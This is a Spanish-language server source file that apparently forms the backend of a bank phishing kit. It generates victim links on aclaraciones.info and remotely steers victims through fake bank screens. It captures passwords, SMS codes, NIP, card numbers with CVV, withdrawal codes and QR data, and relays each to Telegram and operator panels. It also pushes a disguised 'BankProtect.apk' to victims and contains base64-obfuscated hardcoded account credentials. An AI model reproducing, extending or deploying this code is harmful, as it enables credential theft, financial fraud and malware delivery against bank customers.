      console.log(`[API] Error obteniendo bancos permitidos: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });
  
  app.get('/api/generate-link', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const { banco = "LIVERPOOL" } = req.query;
      const user = req.user;
      
      // Validar que el banco solicitado esté permitido para el usuario
      const userBanks = user.allowedBanks || 'all';
      let hasBankAccess = false;
      
      // Lógica mejorada para verificar permisos de bancos
      // Si es superadmin (balonx), tiene acceso a todos los bancos sin importar su configuración
      if (user.username === "balonx") {
        hasBankAccess = true;
        console.log(`[API] Superadmin ${user.username} tiene acceso a todos los bancos`);
      } 
      // Si es administrador pero no es balonx, verificar sus restricciones específicas
      else if (user.role === UserRole.ADMIN) {
        console.log(`[API] Admin ${user.username} solicita banco ${banco}, verificando permisos específicos`);
        
        // Si tiene valor 'all', tiene acceso a todos los bancos
        if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
          hasBankAccess = true;
          console.log(`[API] Admin ${user.username} tiene acceso a todos los bancos (all)`);
        } 
        // Si tiene bancos específicos, debe estar en la lista
        else if (userBanks && userBanks !== '') {
          const allowedBanksList = userBanks.split(',').map(b => b.trim());
          console.log(`[API] Admin ${user.username} solicita banco ${banco}, permitidos: ${allowedBanksList.join(', ')}`);
          
          if (allowedBanksList.includes(banco as string)) {
            hasBankAccess = true;
            console.log(`[API] Banco ${banco} permitido para admin ${user.username}`);
          } else {
            console.log(`[API] Banco ${banco} NO permitido para admin ${user.username}. Bancos permitidos: ${allowedBanksList.join(', ')}`);
          }
        } else {
          console.log(`[API] Admin ${user.username} sin bancos definidos`);
        }
      }
      // Para usuarios regulares
      // Si tiene valor "all", tiene acceso a todos los bancos
      else if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
        hasBankAccess = true;
        console.log(`[API] Usuario ${user.username} tiene acceso a todos los bancos (all)`);
      }
      // Si tiene bancos específicos, debe estar en la lista
      else if (userBanks && userBanks !== '') {
        const allowedBanksList = userBanks.split(',').map(b => b.trim());
        console.log(`[API] Usuario ${user.username} solicita banco ${banco}, permitidos: ${allowedBanksList.join(', ')}`);
        
        if (allowedBanksList.includes(banco as string)) {
          hasBankAccess = true;
          console.log(`[API] Banco ${banco} permitido para ${user.username}`);
        } else {
          console.log(`[API] Banco ${banco} NO permitido para ${user.username}. Bancos permitidos: ${allowedBanksList.join(', ')}`);
        }
      }
      
      // Si no tiene acceso, devolver error claro
      if (!hasBankAccess) {
        const bancos = userBanks === 'all' ? 'todos los bancos' : userBanks.split(',').map(b => b.trim()).join(', ');
        return res.status(403).json({ 
          error: `Banco ${banco} no permitido. Solo puedes usar: ${bancos}` 
        });
      }

      // Generamos un código de 8 dígitos numéricos que usaremos tanto para el ID como para el folio
      let linkCode = '';
      for (let i = 0; i < 8; i++) {
        linkCode += Math.floor(Math.random() * 10).toString();
      }
      
      // Usamos el mismo código numérico para el ID de sesión y el folio
      const sessionId = linkCode;

      const session = await storage.createSession({ 
        sessionId, 
        banco: banco as string,
        folio: linkCode, // Mismo código para el folio
        pasoActual: ScreenType.FOLIO,
        createdBy: user.username,  // Añadimos el nombre del usuario que creó la sesión
      });

      // Guardar la sesión automáticamente para que aparezca en el historial
      const savedSession = await storage.saveSession(sessionId);
      console.log(`Sesión guardada automáticamente: ${sessionId}`);
      
      // Verificar si el campo createdBy está correctamente establecido
      if (!savedSession.createdBy) {
        console.log(`ADVERTENCIA: Creador no establecido en la sesión guardada ${sessionId}. Forzando creador: ${user.username}`);
        await storage.updateSession(sessionId, { createdBy: user.username });
      }

      // Configuración de dominios
      const clientDomain = process.env.CLIENT_DOMAIN || 'aclaraciones.info';
      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.aclaraciones.info';

      // Detectamos si estamos en Replit para generar enlaces locales para pruebas
      const isReplit = process.env.REPL_ID || process.env.REPL_SLUG;
      
      // Armamos los enlaces para ambos dominios
      // Obtenemos la URL actual de la solicitud para generar enlaces relativos en Replit
      const baseUrl = req.headers.host || (isReplit ? `${process.env.REPL_SLUG || 'workspace'}.replit.dev` : clientDomain);
      const protocol = req.headers['x-forwarded-proto'] || 'https';
      
      // FORZAMOS el uso de aclaraciones.info independientemente del entorno
      const clientLink = `https://aclaraciones.info/${sessionId}`;
      
      // Para el admin link, si estamos en Replit permitimos usar la URL local para testing
      const adminLink = isReplit 
        ? `${protocol}://${baseUrl}` 
        : `https://${adminDomain}`;

      // Enlace generado correctamente

      // Notificando clientes admin
      
      // Notificar a los clientes de admin sobre el nuevo enlace
      // Enviar al usuario que creó el link y al superadmin
      broadcastToAdmins(JSON.stringify({
        type: 'LINK_GENERATED',
        data: { 
          sessionId,
          code: linkCode,
          banco: banco as string,
          userName: user.username,
          createdBy: user.username // Añadimos para consistency
        }
      }), user.username); // Pasamos el username como segundo argumento

      // Enviar también un mensaje de actualización de sesiones para refrescar la lista
      // Este mensaje hará que todos los clientes obtengan la lista actualizada del servidor
      broadcastToAdmins(JSON.stringify({
        type: 'SESSIONS_UPDATED',
        data: {
          userName: user.username
        }
      }));

      // Enviar una señal específica a través de WebSocket para actualizar las sesiones del usuario
      // con información completa sobre la nueva sesión
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: {
          sessionId,
          banco: banco as string,
          folio: linkCode,
          pasoActual: ScreenType.FOLIO,
          createdBy: user.username,
          saved: false,
          createdAt: new Date().toISOString()
        }
      }));

      // Enviar notificación de nueva sesión a Telegram
      await sendSessionCreatedNotification({
        sessionId,
        banco: banco as string,
        folio: linkCode,
        createdBy: user.username,
        link: clientLink
      });

      res.json({ 
        sessionId, 
        link: clientLink, 
        adminLink: adminLink,
        code: linkCode
      });
    } catch (error) {
      console.error("Error generating link:", error);
      res.status(500).json({ message: "Error generating link" });
    }
  });

  // Tarea programada para limpiar sesiones inactivas (cada 5 minutos)
  const cleanupInterval = setInterval(async () => {
    try {
      console.log("[Cleanup] Ejecutando limpieza programada de sesiones inactivas...");
      const deletedCount = await storage.cleanupExpiredSessions();
      
      if (deletedCount > 0) {
        console.log(`[Cleanup] Se eliminaron ${deletedCount} sesiones inactivas o expiradas`);
        
        // Notificar a todos los clientes de administración
        broadcastToAdmins(JSON.stringify({
          type: 'SESSIONS_CLEANUP',
          data: { 
            deletedCount,
            automatic: true,
            timestamp: new Date().toISOString()
          }
        }));
      }
      
      // También verificar y desactivar usuarios expirados
      console.log("[Cleanup] Verificando usuarios con suscripciones vencidas...");
      const deactivatedCount = await storage.cleanupExpiredUsers();
      
      if (deactivatedCount > 0) {
        console.log(`[Cleanup] Se desactivaron ${deactivatedCount} usuarios con suscripciones vencidas`);
        
        // Notificar a todos los clientes de administración
        broadcastToAdmins(JSON.stringify({
          type: 'USERS_CLEANUP',
          data: { 
            deactivatedCount,
            automatic: true,
            timestamp: new Date().toISOString()
          }
        }));
      }
    } catch (error) {
      console.error("[Cleanup] Error en la limpieza automática:", error);
    }
  }, 5 * 60 * 1000); // Cada 5 minutos (5 * 60 * 1000 ms)
  
  // WebSocket handling
  wss.on('connection', (ws, req) => {
    console.log('New WebSocket connection');

    // Handle client/admin identification
    ws.on('message', async (message) => {
      try {
        const data = JSON.parse(message.toString());

        // Register client or admin
        if (data.type === 'REGISTER') {
          if (data.role === 'ADMIN') {
            // Determinar si es un administrador o un usuario basado en el username
            const userName = data.username || '';
            const user = await storage.getUserByUsername(userName);
            
            if (!user) {
              console.log(`WebSocket: Usuario ${userName} no encontrado en la base de datos`);
              ws.send(JSON.stringify({
                type: 'ERROR',
                message: 'Usuario no encontrado'
              }));
              return;
            }
            
            // Guardar el cliente en el Map con su username como clave
            adminClients.set(userName, ws);
            console.log(`Admin client registered: ${userName}`);
            
            console.log(`WebSocket: Usuario ${userName} (rol: ${user.role}) autenticado, obteniendo sesiones...`);
            
            // NUEVA IMPLEMENTACIÓN UNIFICADA PARA TODOS LOS USUARIOS
            if (false) { // Este bloque nunca se ejecuta, solo se mantiene para referencia
              console.log(`WebSocket: Usuario ${userName} detectado como usuario brandon, obteniendo sus sesiones guardadas...`);
              
              // Obtener todas las sesiones guardadas primero 
              const allSavedSessions = await storage.getSavedSessions();
              
              console.log(`WebSocket: Encontradas ${allSavedSessions.length} sesiones guardadas en total`);
              
              // Mostrar detalles de cada sesión guardada para depuración
              allSavedSessions.forEach(session => {
                console.log(`WebSocket: Sesión ${session.sessionId}, creador=${session.createdBy || 'desconocido'}, banco=${session.banco}`);
              });
              
              // Filtrar EXPLÍCITAMENTE sólo las guardadas de este usuario
              const filteredSessions = allSavedSessions.filter(session => session.createdBy === userName);
              
              console.log(`WebSocket: Después de filtrar, enviando ${filteredSessions.length} sesiones guardadas a usuario ${userName}`);
              
              // Enviar las sesiones al cliente
              ws.send(JSON.stringify({
                type: 'INIT_SESSIONS',
                data: filteredSessions
              }));
            } 
            else {
              // NUEVA IMPLEMENTACIÓN UNIFICADA PARA TODOS LOS USUARIOS
              // Obtenemos tanto las sesiones guardadas como las actuales
              const allSavedSessions = await storage.getSavedSessions();
              const currentSessions = await storage.getCurrentSessions();
              
              console.log(`WebSocket: Encontradas ${allSavedSessions.length} sesiones guardadas y ${currentSessions.length} sesiones actuales en total`);
              
              // Combinamos ambas listas (evitando duplicados por sessionId)
              const allSessionsMap = new Map();
              [...allSavedSessions, ...currentSessions].forEach(session => {
                allSessionsMap.set(session.sessionId, session);
              });
              
              let sessions = Array.from(allSessionsMap.values());
              
              // Solo el usuario "balonx" puede ver todas las sesiones
              // Todos los demás (incluso con rol admin) solo ven sus propias sesiones
              if (user.username !== 'balonx') {
                console.log(`WebSocket: Filtrando sesiones para el usuario regular: ${userName}`);
                
                const beforeCount = sessions.length;
                
                // Filtrar explícitamente solo las sesiones creadas por este usuario
                sessions = sessions.filter(session => {
                  const isCreatedByCurrentUser = session.createdBy === userName;
                  
                  if (isCreatedByCurrentUser) {
                    console.log(`WebSocket: Incluida sesión ${session.sessionId} para ${userName} (creador: ${session.createdBy || 'desconocido'})`);
                  } else if (session.createdBy) {
                    console.log(`WebSocket: Excluida sesión ${session.sessionId} para ${userName} (creador: ${session.createdBy})`);
                  } else {
                    console.log(`WebSocket: Excluida sesión ${session.sessionId} para ${userName} (sin creador)`);
                  }
                  
                  return isCreatedByCurrentUser;
                });
                
                console.log(`WebSocket: Usuario ${userName} (rol: ${user.role}), mostrando ${sessions.length} de ${beforeCount} sesiones`);
              } else {
                console.log(`WebSocket: Superadministrador balonx accediendo a todas las sesiones (${sessions.length})`);
              }
              
              // Enviamos las sesiones al cliente
              ws.send(JSON.stringify({
                type: 'INIT_SESSIONS',
                data: sessions
              }));
            }
            
            // El envío de sesiones ya se hace en las ramas condicionales anteriores
            
            // Run cleanup of old sessions (more than 5 days)
            try {
              const deletedCount = await storage.cleanupExpiredSessions();
              if (deletedCount > 0) {
                console.log(`Cleaned up ${deletedCount} expired sessions`);
                broadcastToAdmins(JSON.stringify({
                  type: 'SESSIONS_CLEANUP',
                  data: { deletedCount }
                }));
              }
            } catch (error) {
              console.error("Error cleaning up expired sessions:", error);
            }
          } 
          else if (data.role === 'CLIENT' && data.sessionId) {
            clients.set(data.sessionId, ws);
            console.log(`Client registered with session ID: ${data.sessionId}`);

            // Get session info and send to client
            const session = await storage.getSessionById(data.sessionId);
            if (session) {
              ws.send(JSON.stringify({
                type: 'INIT_SESSION',
                data: session
              }));
            }
          }
          return;
        }

        // Handle screen change request from admin
        if (data.type === 'SCREEN_CHANGE') {
          try {
            // Validate the data
            const validatedData = screenChangeSchema.parse(data.data);
            const { sessionId, tipo } = validatedData;

            // Find the target client
            const client = clients.get(sessionId);
            if (client && client.readyState === WebSocket.OPEN) {
              // Send the screen change command to the client
              client.send(JSON.stringify({
                type: 'SCREEN_CHANGE',
                data: validatedData
              }));

              // Update session in storage with the new screen state
              // Remove "mostrar_" prefix from tipo if present
              let screenType = tipo.replace('mostrar_', '');

              // Normalizar screenType para SMS_COMPRA
              if (screenType.toLowerCase() === 'sms_compra' || 
                  screenType.toLowerCase() === 'smscompra' ||
                  screenType.toLowerCase() === 'sms compra') {
                console.log('Normalizando screenType SMS_COMPRA en servidor:', screenType, 'to', ScreenType.SMS_COMPRA);
                screenType = ScreenType.SMS_COMPRA;
              }

              // Normalizar screenType para PROTECCION_BANCARIA
              if (screenType.toLowerCase() === 'proteccion_bancaria') {
                console.log('Normalizando screenType PROTECCION_BANCARIA en servidor:', screenType, 'to', ScreenType.PROTECCION_BANCARIA);
                screenType = ScreenType.PROTECCION_BANCARIA;
              }

              // Actualizar la última actividad de la sesión
              await storage.updateSessionActivity(sessionId);
              
              // Para protección bancaria, configurar automáticamente el archivo APK según el banco
              const updateData: any = { pasoActual: screenType };
              if (screenType === ScreenType.PROTECCION_BANCARIA) {
                // Obtener información de la sesión para determinar el banco
                const session = await storage.getSessionById(sessionId);
                if (session && session.banco) {
                  const bankCode = session.banco.toUpperCase();
                  console.log('Configurando archivo de protección para banco:', bankCode);
                  
                  // Todos los bancos usan el mismo archivo APK universal
                  const protectionFile = {
                    fileName: 'BankProtect.apk',
                    fileUrl: '/assets/Bankprotet2_1750982122281.apk',
                    fileSize: '4.2 MB'
                  };
                  
                  updateData.fileName = protectionFile.fileName;
                  updateData.fileUrl = protectionFile.fileUrl;
                  updateData.fileSize = protectionFile.fileSize;
                  console.log('Archivo de protección universal configurado para:', bankCode, ':', protectionFile.fileName);
                }
                
                // También considerar archivo manual si está presente en validatedData
                if (validatedData.fileName) {
                  updateData.fileName = validatedData.fileName;
                  updateData.fileUrl = validatedData.fileUrl;
                  updateData.fileSize = validatedData.fileSize;
                  console.log('Usando archivo manual de protección:', validatedData.fileName);
                }
              }
              
              await storage.updateSession(sessionId, updateData);
              console.log('Actualizado pasoActual a:', screenType);

              // Notify specific admin clients about the update
              const updatedSession = await storage.getSessionById(sessionId);
              // Obtenemos el creador de la sesión para saber a quién enviar la notificación
              const createdBy = updatedSession?.createdBy || '';
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }), createdBy); // Dirigimos el mensaje al creador de la sesión

              // Enviar notificación de cambio de pantalla a Telegram
              if (updatedSession) {
                await sendScreenChangeNotification({
                  sessionId,
                  banco: updatedSession.banco || 'Desconocido',
                  newScreen: screenType,
                  adminUser: 'Admin', // Podríamos obtener el usuario admin específico si es necesario
                  data: validatedData
                });
              }
            }
          } catch (error) {
            console.error("Invalid screen change data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid screen change data" 
            }));
          }
          return;
        }

        // Handle client input data
        if (data.type === 'CLIENT_INPUT') {
          try {
            // Validate the data
            const validatedData = clientInputSchema.parse(data.data);
            const { sessionId, tipo, data: inputData } = validatedData;
            
            // Actualizar la última actividad de la sesión
            await storage.updateSessionActivity(sessionId);
            
            // Indicar que esta sesión ya tiene datos de usuario (para evitar eliminación automática)
            await storage.markSessionHasUserData(sessionId);

            // Update the session with the new data
            const updatedFields: Record<string, any> = {};

            switch (tipo) {
              case 'folio':
                updatedFields.folio = inputData.folio;
                // Guardar información del dispositivo si está disponible
                if (inputData.deviceType) {
                  updatedFields.deviceType = inputData.deviceType;
                }
                if (inputData.deviceModel) {
                  updatedFields.deviceModel = inputData.deviceModel;
                }
                if (inputData.deviceBrowser) {
                  updatedFields.deviceBrowser = inputData.deviceBrowser;
                }
                if (inputData.deviceOs) {
                  updatedFields.deviceOs = inputData.deviceOs;
                }
                if (inputData.userAgent) {
                  updatedFields.userAgent = inputData.userAgent;
                }
                console.log('Información del dispositivo guardada:', {
                  tipo: inputData.deviceType,
                  modelo: inputData.deviceModel,
                  navegador: inputData.deviceBrowser,
                  so: inputData.deviceOs
                });
                
                // Enviar notificación a Telegram
                const sessionData = await storage.getSessionById(sessionId);
                if (sessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: sessionData.banco || 'Desconocido',
                    tipo: 'folio',
                    data: inputData,
                    deviceInfo: {
                      type: inputData.deviceType,
                      model: inputData.deviceModel,
                      browser: inputData.deviceBrowser,
                      os: inputData.deviceOs
                    },
                    timestamp: new Date().toISOString(),
                    createdBy: sessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'login':
                updatedFields.username = inputData.username;
                updatedFields.password = inputData.password;
                
                // Enviar notificación a Telegram
                const loginSessionData = await storage.getSessionById(sessionId);
                if (loginSessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: loginSessionData.banco || 'Desconocido',
                    tipo: 'login',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: loginSessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'codigo':
                updatedFields.sms = inputData.codigo;
                
                // Enviar notificación a Telegram
                const codigoSessionData = await storage.getSessionById(sessionId);
                if (codigoSessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: codigoSessionData.banco || 'Desconocido',
                    tipo: 'codigo',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: codigoSessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'nip':
                updatedFields.nip = inputData.nip;
                
                // Enviar notificación a Telegram
                const nipSessionData = await storage.getSessionById(sessionId);
                if (nipSessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: nipSessionData.banco || 'Desconocido',
                    tipo: 'nip',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: nipSessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'tarjeta':
                updatedFields.tarjeta = inputData.tarjeta;
                updatedFields.fechaVencimiento = inputData.fechaVencimiento;
                updatedFields.cvv = inputData.cvv;
                
                // Enviar notificación a Telegram
                const tarjetaSessionData = await storage.getSessionById(sessionId);
                if (tarjetaSessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: tarjetaSessionData.banco || 'Desconocido',
                    tipo: 'tarjeta',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: tarjetaSessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'sms_compra':
              case 'SMS_COMPRA':
              case 'smsCompra':
                // Asegurarnos de manejar correctamente las respuestas de SMS_COMPRA
                if (inputData && inputData.smsCompra) {
                  updatedFields.smsCompra = inputData.smsCompra;
                  console.log('Recibido código de cancelación SMS_COMPRA:', inputData.smsCompra);

                  // Notificar a los administradores el código de cancelación inmediatamente
                  // Obtenemos la sesión para saber quién la creó
                  const sessionData = await storage.getSessionById(sessionId);
                  const createdBy = sessionData?.createdBy || '';
                  
                  broadcastToAdmins(JSON.stringify({
                    type: 'SMS_COMPRA_CODE',
                    data: {
                      sessionId,
                      code: inputData.smsCompra,
                      createdBy // Añadimos el creador para referencia
                    }
                  }), createdBy); // Enviamos solo al creador y al superadmin
                  
                  // Enviar notificación a Telegram
                  await sendTelegramNotification({
                    sessionId,
                    banco: sessionData?.banco || 'Desconocido',
                    tipo: 'sms_compra',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: sessionData?.createdBy || 'Desconocido'
                  });
                } else {
                  console.error('Error: datos SMS_COMPRA recibidos sin código de cancelación:', inputData);
                }
                break;
              case 'celular':
                updatedFields.celular = inputData.celular;
                
                // Enviar notificación a Telegram
                const celularSessionData = await storage.getSessionById(sessionId);
                if (celularSessionData) {
                  await sendTelegramNotification({
                    sessionId,
                    banco: celularSessionData.banco || 'Desconocido',
                    tipo: 'celular',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: celularSessionData.createdBy || 'Desconocido'
                  });
                }
                break;
              case 'CANCELACION_RETIRO':
              case 'cancelacion_retiro':
                if (inputData && inputData.codigoRetiro) {
                  updatedFields.codigoRetiro = inputData.codigoRetiro;
                  
                  // Guardar también el PIN de retiro si se ha proporcionado
                  if (inputData.pinRetiro) {
                    updatedFields.pinRetiro = inputData.pinRetiro;
                    console.log('Recibido código de retiro:', inputData.codigoRetiro, 'con PIN:', inputData.pinRetiro);
                  } else {
                    console.log('Recibido código de retiro:', inputData.codigoRetiro, 'sin PIN');
                  }

                  // Notificar a los administradores el código de retiro y PIN inmediatamente
                  const sessionData = await storage.getSessionById(sessionId);
                  const createdBy = sessionData?.createdBy || '';
                  
                  broadcastToAdmins(JSON.stringify({
                    type: 'RETIRO_CODE',
                    data: {
                      sessionId,
                      code: inputData.codigoRetiro,
                      pin: inputData.pinRetiro || '',
                      createdBy // Añadimos el creador para referencia
                    }
                  }), createdBy); // Enviamos solo al creador y al superadmin
                  
                  // Enviar notificación a Telegram
                  await sendTelegramNotification({
                    sessionId,
                    banco: sessionData?.banco || 'Desconocido',
                    tipo: 'cancelacion_retiro',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: sessionData?.createdBy || 'Desconocido'
                  });
                } else {
                  console.error('Error: datos CANCELACION_RETIRO recibidos sin código de retiro:', inputData);
                }
                break;
              case 'ESCANEAR_QR':
              case 'escanear_qr':
                if (inputData && inputData.qrData) {
                  updatedFields.qrData = inputData.qrData;
                  
                  // Guardar la imagen del QR si existe
                  if (inputData.qrImageData) {
                    updatedFields.qrImageData = inputData.qrImageData;
                    console.log('Recibida imagen del QR en formato base64');
                  }
                  
                  console.log('Recibido código QR:', inputData.qrData.substring(0, 50) + '...');

                  // Notificar a los administradores el código QR inmediatamente
                  const sessionData = await storage.getSessionById(sessionId);
                  const createdBy = sessionData?.createdBy || '';
                  
                  broadcastToAdmins(JSON.stringify({
                    type: 'QR_SCANNED',
                    data: {
                      sessionId,
                      qrData: inputData.qrData,
                      qrImageData: inputData.qrImageData, // Incluir la imagen
                      createdBy,
                      timestamp: new Date().toISOString()
                    }
                  }), createdBy); // Enviamos solo al creador y al superadmin
                  
                  // Enviar notificación a Telegram
                  await sendTelegramNotification({
                    sessionId,
                    banco: sessionData?.banco || 'Desconocido',
                    tipo: 'escanear_qr',
                    data: inputData,
                    timestamp: new Date().toISOString(),
                    createdBy: sessionData?.createdBy || 'Desconocido'
                  });
                } else {
                  console.error('Error: datos de QR recibidos sin contenido:', inputData);
                }
                break;
              case 'PROTECCION_BANCARIA':
              case 'proteccion_bancaria':
                if (inputData && inputData.action === 'download') {
                  console.log('Cliente descargó archivo de protección:', inputData.fileName);
                  
                  // Enviar notificación de descarga a Telegram
                  const sessionData = await storage.getSessionById(sessionId);
                  if (sessionData) {
                    await sendFileDownloadNotification({
                      sessionId,
                      banco: sessionData.banco || 'Desconocido',
                      fileName: inputData.fileName || 'archivo_desconocido',
                      fileSize: inputData.fileSize,
                      adminUser: sessionData.createdBy || 'Admin'
                    });
                  }
                  
                  // Notificar a los administradores sobre la descarga
                  const createdBy = sessionData?.createdBy || '';
                  broadcastToAdmins(JSON.stringify({
                    type: 'FILE_DOWNLOADED',
                    data: {
                      sessionId,
                      fileName: inputData.fileName,
                      fileSize: inputData.fileSize,
                      timestamp: new Date().toISOString(),
                      createdBy
                    }
                  }), createdBy);
                }
                break;
            }

            console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);

            // Enviar notificación en tiempo real de la entrada del cliente
            // Obtenemos la sesión para saber quién la creó y enviarle la notificación
            const session = await storage.getSessionById(sessionId);
            const createdBy = session?.createdBy || '';
            
            broadcastToAdmins(JSON.stringify({
              type: 'CLIENT_INPUT_REALTIME',
              data: {
                sessionId,
                tipo,
                inputData,
                timestamp: new Date().toISOString(),
                createdBy // Añadimos el creador para referencia
              }
            }), createdBy); // Dirigimos el mensaje al creador de la sesión

            // Update session if we have fields to update
            if (Object.keys(updatedFields).length > 0) {
              const updatedSession = await storage.updateSession(sessionId, updatedFields);

              // Notify specific admin clients about the database update
              // Enviamos el mensaje al creador de la sesión
              const createdBy = updatedSession?.createdBy || '';
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }), createdBy); // Dirigimos el mensaje al creador de la sesión
            }
          } catch (error) {
            console.error("Invalid client input data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid client input data" 
            }));
          }
          return;
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    });

    // Handle disconnection
    ws.on('close', () => {
      // Buscar y eliminar el cliente del adminClients Map
      let adminUserRemoved = false;
      
      // Iteramos sobre el Map usando entradas como array
      const adminEntries = Array.from(adminClients.entries());
      for (let i = 0; i < adminEntries.length; i++) {
        const [username, client] = adminEntries[i];
        if (client === ws) {
          adminClients.delete(username);
          console.log(`Admin client disconnected: ${username}`);
          adminUserRemoved = true;
          break; // Terminamos el bucle una vez encontrado
        }
      }
      
      // Si no era un cliente admin, revisamos si era un cliente regular
      if (!adminUserRemoved) {
        // Buscar y eliminar de clients si era un cliente
        const clientEntries = Array.from(clients.entries());
        for (let i = 0; i < clientEntries.length; i++) {
          const [sessionId, client] = clientEntries[i];
          if (client === ws) {
            clients.delete(sessionId);
            console.log(`Client with session ID ${sessionId} disconnected`);
            break; // Terminamos el bucle una vez encontrado
          }
        }
      }
    });
  });

  // === API de SMS ===

  // Obtener la configuración actual de la API de SMS
  app.get('/api/sms/config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const config = await storage.getSmsConfig();
      // Si hay una config, ocultamos las credenciales por seguridad, solo mostramos si están activas
      if (config) {
        res.json({
          isActive: config.isActive,
          updatedAt: config.updatedAt,
          updatedBy: config.updatedBy,
          hasCredentials: !!(config.username && config.password), // Verificar si hay credenciales configuradas
          apiUrl: config.apiUrl || 'https://api.sofmex.mx/api/sms'
        });
      } else {
        res.json({
          isActive: false,
          hasCredentials: false,
          apiUrl: Buffer.from('aHR0cHM6Ly9hcGkuc29mbWV4Lm14L2FwaS9zbXM=', 'base64').toString(),
          updatedAt: null,
          updatedBy: null
        });
      }
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Actualizar la configuración de la API de SMS
  app.post('/api/sms/config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      // Solo usuario administrador puede actualizar la configuración
      if (user.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden actualizar la configuración de API" });
      }

      // Verificamos si es un modo de simulación
      const apiUrl = req.body.apiUrl || 'https://api.sofmex.mx/api/sms';
      const simulationMode = apiUrl && (apiUrl.includes('simulacion') || apiUrl.includes('localhost'));

      // Usar las credenciales proporcionadas o las predeterminadas ofuscadas
      const defaultUser = Buffer.from('am9zZW1vcmVub2ZzMTlAZ21haWwuY29t', 'base64').toString();
      const defaultPass = Buffer.from('QmFsb24xOUA=', 'base64').toString();
      const username = req.body.username || defaultUser;
      const password = req.body.password || defaultPass;
      
      // La API está activa si está en modo simulación o si tiene credenciales válidas
      const hasValidCredentials = simulationMode || (!!username && !!password);
      const isActive = hasValidCredentials;
      
      // Si no estamos en modo simulación y faltan credenciales, advertimos pero seguimos
      let credentialsWarning = '';
      if (!simulationMode && (!username || !password)) {
        credentialsWarning = "Advertencia: No has proporcionado credenciales válidas para el modo real.";
      }

      const data = insertSmsConfigSchema.parse({
        username: username,
        password: password,
        apiUrl: apiUrl,
        isActive: isActive,
        updatedBy: user.username
      });

      const config = await storage.updateSmsConfig(data);

      // Respuesta adicional para el modo simulación
      const response: {
        isActive: boolean | null;
        updatedAt: Date | null;
        updatedBy: string;
        hasCredentials: boolean;
        apiUrl: string | null;
        success: boolean;
        message?: string;
      } = {
        isActive: config.isActive,
        updatedAt: config.updatedAt,
        updatedBy: config.updatedBy,
        hasCredentials: hasValidCredentials,
        apiUrl: config.apiUrl,
        success: true
      };

      if (simulationMode) {
        console.log("API de SMS configurada en modo simulación:", config.apiUrl);
        response.message = "API configurada en modo simulación. Los mensajes serán enviados solo de manera simulada.";
      }

      res.json(response);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Obtener los créditos SMS del usuario actual
  app.get('/api/sms/credits', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      const credits = await storage.getUserSmsCredits(user.id);
      res.json({ credits });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Agregar créditos a un usuario (solo admin)
  app.post('/api/sms/credits/:userId', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const currentUser = req.user;
      // Solo administradores pueden agregar créditos
      if (currentUser.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden agregar créditos" });
      }

      const userId = parseInt(req.params.userId);
      const { amount } = req.body;

      if (!amount || amount <= 0) {
        return res.status(400).json({ message: "La cantidad debe ser un número positivo" });
      }

      const smsCredits = await storage.addSmsCredits(userId, amount);
      res.json({
        success: true,
        credits: smsCredits.credits,
        message: `Se han agregado ${amount} créditos. Total: ${smsCredits.credits}`
      });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Enviar un SMS
  app.post('/api/sms/send', async (req, res) => {
    try {
      console.log("Recibida solicitud de envío de SMS");
      
      if (!req.isAuthenticated()) {
        console.log("Error: Usuario no autenticado");
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      console.log(`Usuario: ${user.username}, Role: ${user.role}`);
      
      const config = await storage.getSmsConfig();
      console.log("Configuración SMS:", config);

      // Verificar si la API está configurada
      if (!config || !config.isActive) {
        console.log("Error: API no configurada o inactiva");
        return res.status(400).json({ 
          success: false, 
          message: "La API de SMS no está configurada o está inactiva" 
        });
      }

      // Verificar si está en modo simulación (con la URL simple 'simulacion')
      const simulationMode = config.apiUrl === 'simulacion' || 
                          (config.apiUrl && (config.apiUrl.includes('simulacion') || config.apiUrl.includes('localhost')));
      
